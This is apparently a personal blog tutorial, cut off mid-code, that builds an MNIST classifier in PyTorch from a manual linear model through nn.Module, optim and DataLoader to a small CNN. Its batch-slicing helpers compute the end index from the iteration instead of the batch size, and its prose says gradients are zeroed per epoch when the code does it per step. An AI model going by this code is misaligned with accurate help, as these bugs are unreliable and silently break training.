<h3 id="Download-MNIST-Data"><a href="#Download-MNIST-Data" class="headerlink" title="Download MNIST Data"></a>Download MNIST Data</h3><p>data download link: <a target="_blank" rel="noopener" href="https://github.com/pytorch/tutorials/raw/master/_static/mnist.pkl.gz">https://github.com/pytorch/tutorials/raw/master/_static/mnist.pkl.gz</a></p>
<p>After manually decompressing this file, we use <code>pickle</code> to read data.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_data</span>():</span></span><br><span class="line">    path = Path(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.exists():</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            (XTrain, YTrain), (XTest, YTest), _ = pickle.load(f, encoding=<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> XTrain, YTrain, XTest, YTest</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(FileNotFoundError)</span><br></pre></td></tr></table></figure>
<p>It’s worth mentioning that the second dimension of <code>XTrain</code> and <code>XTest</code> are 784, which is identical to 28 * 28.</p>
<p>Using <code>plt.imshow</code> and <code>plt.show</code> function, single data can be shown easily.</p>
<p>Here is the initial code implementing MNIST with few feature of PyTorch:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_data</span>():</span></span><br><span class="line">    path = Path(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.exists():</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            (XTrain, YTrain), (XTest, YTest), _ = pickle.load(f, encoding=<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> XTrain, YTrain, XTest, YTest</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(FileNotFoundError)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">draw</span>(<span class="params">X</span>):</span></span><br><span class="line">    print(X.shape)</span><br><span class="line">    plt.imshow(X.reshape((<span class="number">28</span>, <span class="number">28</span>)), cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_softmax</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x - x.exp().<span class="built_in">sum</span>(-<span class="number">1</span>).log().unsqueeze(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">X</span>):</span></span><br><span class="line">    <span class="keyword">return</span> log_softmax(X @ weights + bias)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nll</span>(<span class="params">batch_z, batch_y</span>):</span></span><br><span class="line">    <span class="keyword">return</span> -batch_z[<span class="built_in">range</span>(batch_y.shape[<span class="number">0</span>]), batch_y].mean()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">loss_func = nll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">accuracy</span>(<span class="params">batch_z, batch_y</span>):</span></span><br><span class="line">    temp = torch.argmax(batch_z, dim=<span class="number">1</span>)</span><br><span class="line">    r = (temp == batch_y)</span><br><span class="line">    <span class="keyword">return</span> r.<span class="built_in">float</span>().mean()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_batch_train_data</span>(<span class="params">batch_size, iteration</span>):</span></span><br><span class="line">    start = batch_size * iteration</span><br><span class="line">    end = start + iteration</span><br><span class="line">    <span class="keyword">return</span> XTrain[start:end], YTrain[start:end]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_batch_test_data</span>(<span class="params">batch_size, iteration</span>):</span></span><br><span class="line">    start = batch_size * iteration</span><br><span class="line">    end = start + iteration</span><br><span class="line">    <span class="keyword">return</span> XTest[start:end], YTest[start:end]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XTrain, YTrain, XTest, YTest = read_data()  <span class="comment"># train: 50000, test: 10000</span></span><br><span class="line">XTrain, YTrain, XTest, YTest = <span class="built_in">map</span>(torch.tensor, (XTrain, YTrain, XTest, YTest))</span><br><span class="line"></span><br><span class="line">weights = torch.randn(<span class="number">784</span>, <span class="number">10</span>) / math.sqrt(<span class="number">784</span>)</span><br><span class="line">weights.requires_grad_()</span><br><span class="line">bias = torch.zeros(<span class="number">10</span>, requires_grad=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>(<span class="params">max_epoch, max_iteration, batch_size, lr</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;training...&#x27;</span>)</span><br><span class="line">    <span class="keyword">global</span> weights, bias</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(max_epoch):</span><br><span class="line">        <span class="keyword">for</span> iteration <span class="keyword">in</span> <span class="built_in">range</span>(max_iteration):</span><br><span class="line">            start = iteration * batch_size</span><br><span class="line">            end = start + batch_size</span><br><span class="line">            batch_x, batch_y = get_batch_train_data(batch_size, iteration)</span><br><span class="line">            batch_z = forward(batch_x)</span><br><span class="line">            loss = loss_func(batch_z, batch_y)</span><br><span class="line"></span><br><span class="line">            loss.backward()</span><br><span class="line">            <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">                weights -= lr * weights.grad</span><br><span class="line">                bias -= lr * bias.grad</span><br><span class="line">                weights.grad.zero_()</span><br><span class="line">                bias.grad.zero_()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;training done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;testing...&#x27;</span>)</span><br><span class="line">    ZTest = forward(XTest)</span><br><span class="line">    print(<span class="string">&#x27;loss=%.4f, accuracy=%.4f&#x27;</span> % (loss_func(ZTest, YTest), accuracy(ZTest, YTest)))</span><br><span class="line">    print(<span class="string">&#x27;testing done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    num_train = XTrain.shape[<span class="number">0</span>]</span><br><span class="line">    num_test = XTest.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># batch_x = XTrain[:batch_size]</span></span><br><span class="line">    <span class="comment"># batch_z = forward(batch_x)</span></span><br><span class="line">    <span class="comment"># print(batch_z[0], batch_z.shape)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># batch_y = YTrain[:batch_size]</span></span><br><span class="line">    <span class="comment"># print(loss_func(batch_z, batch_y))</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># print(accuracy(batch_z, batch_y))</span></span><br><span class="line"></span><br><span class="line">    batch_size = <span class="number">64</span></span><br><span class="line">    lr = <span class="number">0.05</span></span><br><span class="line">    max_epoch = <span class="number">20</span></span><br><span class="line">    max_iteration = math.ceil(num_train / batch_size)</span><br><span class="line">    train(max_epoch, max_iteration, batch_size, lr)</span><br><span class="line">    test()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Most of the details can be answered if you have learnt about the basic knowledge of neural network, and most of the procedures are very similar to <a href="github.com/microsoft/ai-edu">the tutorial I learn</a>.</p>
<p>Now the magic just begins.</p>
<h2 id="Where-can-be-simplified-using-PyTorch-feature"><a href="#Where-can-be-simplified-using-PyTorch-feature" class="headerlink" title="Where can be simplified using PyTorch feature?"></a>Where can be simplified using PyTorch feature?</h2><h3 id="choosing-from-torch-nn-functional"><a href="#choosing-from-torch-nn-functional" class="headerlink" title="choosing from torch.nn.functional"></a>choosing from torch.nn.functional</h3><p>In previous code, we must manually define a function <code>nll</code> for calculating loss, which can be replaced by <code>torch.nn.functional</code>.</p>
<p>This stuff contains lots of functions, so that we needn’t implement each function we use, which is quite convenient.</p>
<h2 id="extending-torch-nn-Module"><a href="#extending-torch-nn-Module" class="headerlink" title="extending torch.nn.Module"></a>extending torch.nn.Module</h2><p>we can define our whole neural network as a class, whose super class is <code>torch.nn.Module</code>. In this way, parameters can be stored inside this object, which is friendly for us to program.</p>
<h2 id="using-layer-objects-from-torch-nn"><a href="#using-layer-objects-from-torch-nn" class="headerlink" title="using layer objects from torch.nn"></a>using layer objects from torch.nn</h2><p>The model previous code uses is exactly a linear layer, which can be replaced by <code>torch.nn.Linear</code>, which contains parameters within it.</p>
<p>What’s more, pooling layer, convolution layer are also available to use in <code>torch.nn</code>, which greatly reduces workflow.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">loss_func = F.cross_entropy</span><br><span class="line">model = NeuralNet() <span class="comment"># I am hanhan!</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>(<span class="params">max_epoch, max_iteration, batch_size, lr</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;training...&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(max_epoch):</span><br><span class="line">        <span class="keyword">for</span> iteration <span class="keyword">in</span> <span class="built_in">range</span>(max_iteration):</span><br><span class="line">            batch_x, batch_y = get_batch_train_data(batch_size, iteration)</span><br><span class="line">            batch_z = model(batch_x)</span><br><span class="line">            loss = loss_func(batch_z, batch_y)</span><br><span class="line"></span><br><span class="line">            loss.backward()</span><br><span class="line">            <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">                <span class="keyword">for</span> p <span class="keyword">in</span> model.parameters():</span><br><span class="line">                    p -= p.grad * lr</span><br><span class="line">                model.zero_grad()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;training done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;testing...&#x27;</span>)</span><br><span class="line">    ZTest = model(XTest)</span><br><span class="line">    print(<span class="string">&#x27;loss=%.4f, accuracy=%.4f&#x27;</span> % (loss_func(ZTest, YTest), accuracy(ZTest, YTest)))</span><br><span class="line">    print(<span class="string">&#x27;testing done.&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="modifying-parameters-by-torch-optim"><a href="#modifying-parameters-by-torch-optim" class="headerlink" title="modifying parameters by torch.optim"></a>modifying parameters by torch.optim</h2><p><code>torch.optim</code> includes many methods of optimization, including most commonly-used SGD. With this tool, we needn’t traverse all parameters and subtract its specific value from itself, but only write two lines of code:</p>
<p>Before:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> model.parameters():</span><br><span class="line">        p -= p.grad * lr</span><br><span class="line">    model.zero_grad()</span><br></pre></td></tr></table></figure><br>After:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">    optimizer.step()</span><br><span class="line">    optimizer.zero_grad()</span><br></pre></td></tr></table></figure><br>Remember to zero grad after each epoch is done, otherwise the gradients will become way too large and get unexpected results.</p>
<p>btw, why I comment that I am hanhan? Because I made mistake on <code>model</code>. Here <code>model</code> must be an instance of <code>NeuralNet</code> rather than a alias, for the values of weights are random. Otherwise, your loss value will always get above 2…</p>
<h3 id="loading-dataset-and-dataloader"><a href="#loading-dataset-and-dataloader" class="headerlink" title="loading dataset and dataloader"></a>loading dataset and dataloader</h3><p>How to import?</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> TensorDataset, DataLoader</span><br></pre></td></tr></table></figure>
<p>How to declare?<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">train_set = TensorDataset(XTrain, YTrain)</span><br><span class="line">train_loader = DataLoader(train_set, batch_size=bs, shuffle=<span class="literal">True</span>)</span><br><span class="line">valid_set = TensorDataset(XValid, YValid)</span><br><span class="line">valid_loader = DataLoader(valid_set, batch_size=bs * <span class="number">2</span>, shuffle=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><br>Where is the validation set? I just generate the validation set by extracting one tenth of data of training set. This trick is learnt from “microsoft/ai-edu”.</p>
<p>Since we have things prepared, the whole training code is simple:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;training...&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(max_epoch):</span><br><span class="line">        model.train() <span class="comment"># written before training</span></span><br><span class="line">        <span class="keyword">for</span> batch_x, batch_y <span class="keyword">in</span> train_loader: <span class="comment"># traversal simplified</span></span><br><span class="line">            batch_z = model(batch_x)</span><br><span class="line">            loss = loss_func(batch_z, batch_y)</span><br><span class="line">            loss.backward()</span><br><span class="line">            optimizer.step()</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">        model.<span class="built_in">eval</span>() <span class="comment"># written before validating</span></span><br><span class="line">        <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">            valid_loss = <span class="built_in">sum</span>(loss_func(model(batch_x), batch_y) <span class="keyword">for</span> batch_x, batch_y <span class="keyword">in</span> valid_loader) / num_valid</span><br><span class="line">        print(<span class="string">&quot;epoch %d, validation loss=%.4f&quot;</span> % (epoch, valid_loss))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;training done.&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="Switch-to-CNN"><a href="#Switch-to-CNN" class="headerlink" title="Switch to CNN"></a>Switch to CNN</h2><p>CNN is widely used when data is images. Now let’s try to solve MNIST with CNN, just to feel how powerful CNN is.</p>
<p>In fact, most of the code remain the same. The only area we need to modify is in the definition of class, replacing linear layer with more complex layers.</p>
<p>Here is the code:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn, optim</span><br><span class="line"><span class="keyword">from</span> torch.nn <span class="keyword">import</span> functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> TensorDataset, DataLoader</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># class MNIST(nn.Module):</span></span><br><span class="line"><span class="comment">#     def __init__(self):</span></span><br><span class="line"><span class="comment">#         super(MNIST, self).__init__()</span></span><br><span class="line"><span class="comment">#         self.conv1 = nn.Conv2d(1, 16, kernel_size=3, stride=2, padding=1)</span></span><br><span class="line"><span class="comment">#         self.conv2 = nn.Conv2d(16, 16, kernel_size=3, stride=2, padding=1)</span></span><br><span class="line"><span class="comment">#         self.conv3 = nn.Conv2d(16, 10, kernel_size=3, stride=2, padding=1)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     def forward(self, batch_x):</span></span><br><span class="line"><span class="comment">#         batch_x = batch_x.view(-1, 1, 28, 28)</span></span><br><span class="line"><span class="comment">#         batch_x = F.relu(self.conv1(batch_x))</span></span><br><span class="line"><span class="comment">#         batch_x = F.relu(self.conv2(batch_x))</span></span><br><span class="line"><span class="comment">#         batch_x = F.relu(self.conv3(batch_x))</span></span><br><span class="line"><span class="comment">#         batch_x = F.avg_pool2d(batch_x, 4)</span></span><br><span class="line"><span class="comment">#         return batch_x.view(-1, batch_x.size(1))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">draw</span>(<span class="params">X</span>):</span></span><br><span class="line">    print(X.shape)</span><br><span class="line">    plt.imshow(X.reshape((<span class="number">28</span>, <span class="number">28</span>)), cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_data</span>():</span></span><br><span class="line">    path = Path(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.exists():</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            (XTrain, YTrain), (XTest, YTest), _ = pickle.load(f, encoding=<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> XTrain, YTrain, XTest, YTest</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(FileNotFoundError)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_validation_set</span>(<span class="params">k=<span class="number">10</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> num_train, XTrain, YTrain</span><br><span class="line">    num_valid = num_train // k</span><br><span class="line">    num_train -= num_valid</span><br><span class="line">    XValid, YValid = XTrain[:num_valid], YTrain[:num_valid]</span><br><span class="line">    XTrain, YTrain = XTrain[num_valid:], YTrain[num_valid:]</span><br><span class="line">    <span class="keyword">return</span> XValid, YValid, num_valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XTrain, YTrain, XTest, YTest = read_data()  <span class="comment"># train: 50000, test: 10000</span></span><br><span class="line">num_train = XTrain.shape[<span class="number">0</span>]</span><br><span class="line">num_test = XTest.shape[<span class="number">0</span>]</span><br><span class="line">XValid, YValid, num_valid = generate_validation_set(k=<span class="number">10</span>)</span><br><span class="line">XTrain, YTrain, XValid, YValid, XTest, YTest = <span class="built_in">map</span>(torch.tensor, (XTrain, YTrain, XValid, YValid, XTest, YTest))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">accuracy</span>(<span class="params">batch_z, batch_y</span>):</span></span><br><span class="line">    temp = torch.argmax(batch_z, dim=<span class="number">1</span>)</span><br><span class="line">    r = (temp == batch_y)</span><br><span class="line">    <span class="keyword">return</span> r.<span class="built_in">float</span>().mean()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lambda</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, func</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Lambda, self).__init__()</span><br><span class="line">        self.func = func</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.func(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hyper-parameter</span></span><br><span class="line">bs = <span class="number">64</span></span><br><span class="line">lr = <span class="number">0.1</span></span><br><span class="line">momentum = <span class="number">0.9</span></span><br><span class="line">max_epoch = <span class="number">20</span></span><br><span class="line"><span class="comment"># essential stuff</span></span><br><span class="line">loss_func = F.cross_entropy</span><br><span class="line"><span class="comment"># model = MNIST()</span></span><br><span class="line">model = nn.Sequential(</span><br><span class="line">    Lambda(<span class="keyword">lambda</span> x: x.view(-<span class="number">1</span>, <span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>)),</span><br><span class="line">    nn.Conv2d(<span class="number">1</span>, <span class="number">16</span>, kernel_size=<span class="number">3</span>, stride=<span class="number">2</span>, padding=<span class="number">1</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.Conv2d(<span class="number">16</span>, <span class="number">16</span>, kernel_size=<span class="number">3</span>, stride=<span class="number">2</span>, padding=<span class="number">1</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.Conv2d(<span class="number">16</span>, <span class="number">10</span>, kernel_size=<span class="number">3</span>, stride=<span class="number">2</span>, padding=<span class="number">1</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.AvgPool2d(<span class="number">4</span>),</span><br><span class="line">    Lambda(<span class="keyword">lambda</span> x: x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)),</span><br><span class="line">)</span><br><span class="line"><span class="comment"># <span class="doctag">NOTE:</span> relu is different in these two forms!(F.relu vs nn.ReLU)</span></span><br><span class="line">optimizer = optim.SGD(model.parameters(), lr=lr, momentum=momentum)</span><br><span class="line"><span class="comment"># datasets and dataloaders</span></span><br><span class="line">train_set = TensorDataset(XTrain, YTrain)</span><br><span class="line">train_loader = DataLoader(train_set, batch_size=bs, shuffle=<span class="literal">True</span>)</span><br><span class="line">valid_set = TensorDataset(XValid, YValid)</span><br><span class="line">valid_loader = DataLoader(valid_set, batch_size=bs * <span class="number">2</span>, shuffle=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;training...&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(max_epoch):</span><br><span class="line">        model.train()</span><br><span class="line">        <span class="comment"># training: using training set</span></span><br><span class="line">        <span class="keyword">for</span> batch_x, 